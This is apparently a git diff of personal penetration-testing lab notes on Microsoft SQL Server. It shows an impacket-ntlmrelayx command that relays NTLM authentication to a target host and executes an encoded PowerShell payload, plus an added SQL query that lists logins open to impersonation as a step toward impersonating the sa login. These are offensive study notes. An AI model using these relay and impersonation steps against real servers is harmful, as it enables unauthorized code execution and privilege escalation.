@@ -74,3 +74,15 @@ kick off netlm relay, and run our listener to catch the call back
 ```
 sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc payload'
 ```
+#### Privilege Escalation
+
+EXECUTE AS statement provides a way to execute a SQL query in the context of a different login or user. We could use this to escalate our ptivilege.
+
+We can enumerate which logins allow impersonation, which get the this information using the database query
+```
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals
+b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+Putting in it a c# script, we have [enumimpernoate.cs](/13MSSQL/enumImpernoate.cs)
+
+after running the code, i identify that the sa login allow impersonation, we will try to impersonate the sa login
